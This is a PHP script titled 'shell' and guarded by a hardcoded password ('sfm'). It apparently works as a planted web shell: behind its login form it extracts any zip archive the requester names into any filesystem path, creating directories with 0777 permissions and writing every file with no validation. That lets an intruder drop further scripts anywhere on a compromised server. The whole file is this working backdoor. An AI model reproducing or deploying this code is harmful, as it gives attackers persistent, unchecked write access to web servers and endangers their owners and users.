<?php
$website='shell';

$PASSWORD = 'sfm'; 
session_start();
if(!$_SESSION['_sfm_allowed']) {
	// sha1, and random bytes to thwart timing attacks.  Not meant as secure hashing.	
	//zhangqun modify
	//$t = bin2hex(openssl_random_pseudo_bytes(10));
	//if($_POST['p'] && sha1($t.$_POST['p']) === sha1($t.$PASSWORD)) {
	if($_POST['p'] && $_POST['p'] === $PASSWORD) {
		$_SESSION['_sfm_allowed'] = true;
		header('Location: ?');
	}
	echo '<html><body><form action=? method=post>PASSWORD:<input type=password name=p /></form></body></html>'; 
	exit;
}

function get_zip_originalsize($filename, $path) {
 //先判断待解压的文件是否存在
 if(!file_exists($filename)){
  die("文件 $filename 不存在！");
 } 
 $starttime = explode(' ',microtime()); //解压开始的时间

 //将文件名和路径转成windows系统默认的gb2312编码，否则将会读取不到
 //$filename = iconv("utf-8","gb2312",$filename);
 //$path = iconv("utf-8","gb2312",$path);
 //打开压缩包
 $resource = zip_open($filename);
 $i = 1;
 //遍历读取压缩包里面的一个个文件
 while ($dir_resource = zip_read($resource)) {
  //如果能打开则继续
  if (zip_entry_open($resource,$dir_resource)) {
   //获取当前项目的名称,即压缩包里面当前对应的文件名
   $file_name = $path.zip_entry_name($dir_resource);
   //以最后一个“/”分割,再用字符串截取出路径部分
   $file_path = substr($file_name,0,strrpos($file_name, "/"));
   //如果路径不存在，则创建一个目录，true表示可以创建多级目录
   if(!is_dir($file_path)){
   	echo "will mkdir ".$file_path."<br />";
    mkdir($file_path,0777,true);
   }
   //如果不是目录，则写入文件
   if(!is_dir($file_name)){
    //读取这个文件
    $file_size = zip_entry_filesize($dir_resource);
    //最大读取6M，如果文件过大，跳过解压，继续下一个
    //if($file_size<(1024*1024*6)){
     $file_content = zip_entry_read($dir_resource,$file_size);
     echo "will file_put_contents ".$file_name."<br />";
     file_put_contents($file_name,$file_content);
    //}else{
    // echo "<p> ".$i++." 此文件已被跳过，原因：文件过大， -> ".iconv("gb2312","utf-8",$file_name)." </p>";
    //}
   }
   //关闭当前
   zip_entry_close($dir_resource);
  }
 }
 //关闭压缩包
 zip_close($resource); 
 $endtime = explode(' ',microtime()); //解压结束的时间
 $thistime = $endtime[0]+$endtime[1]-($starttime[0]+$starttime[1]);
 $thistime = round($thistime,3); //保留3为小数
 echo "<p>解压完毕！，本次解压花费：$thistime 秒。</p>";
}

function my_zip()
{
//需开启配置 php_zip.dll
//phpinfo();
header("Content-type:text/html;charset=utf-8");
$size = get_zip_originalsize($_POST['q'],$_POST['path']);
}

	if ($_SERVER['REQUEST_METHOD'] == "GET"){
?>

<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<title><?php echo $website ?></title>

	<style type="text/css">

	::selection { background-color: #E13300; color: white; }
	::-moz-selection { background-color: #E13300; color: white; }

	body {
		background-color: #fff;
		margin: 40px;
		font: 13px/20px normal Helvetica, Arial, sans-serif;
		color: #4F5155;
	}

	a {
		color: #003399;
		background-color: transparent;
		font-weight: normal;
	}

	h1 {
		color: #444;
		background-color: transparent;
		border-bottom: 1px solid #D0D0D0;
		font-size: 19px;
		font-weight: normal;
		margin: 0 0 14px 0;
		padding: 14px 15px 10px 15px;
	}

	code {
		font-family: Consolas, Monaco, Courier New, Courier, monospace;
		font-size: 12px;
		background-color: #f9f9f9;
		border: 1px solid #D0D0D0;
		color: #002166;
		display: block;
		margin: 14px 0 14px 0;
		padding: 12px 10px 12px 10px;
	}

	#body {
		margin: 0 15px 0 15px;
	}

	p.footer {
		text-align: right;
		font-size: 11px;
		border-top: 1px solid #D0D0D0;
		line-height: 32px;
		padding: 0 10px 0 10px;
		margin: 20px 0 0 0;
	}

	#container {
		margin: 10px;
		border: 1px solid #D0D0D0;
		box-shadow: 0 0 8px #D0D0D0;
	}
	</style>
</head>
<body>

<div id="container">
	<h1><?php echo $website ?></h1>

	<div id="body">
		<form method="post" enctype="multipart/form-data" id="container" style="text-align: center;padding: 180px 0px 180px 0px;">
			<input id="id_content" name="q" type="text" style="padding: 10px;" size="100">
			<input id="id_content" name="path" type="text" style="padding: 10px;" size="100">
			<input type="submit" value="Enter" style="padding: 10px 40px 10px 40px;margin-left: 36px;">
		</form>
	</div>

	<p class="footer">@2016 Perorsoft</p>
</div>

</body>
</html>

<?php }else{
	my_zip();
} ?>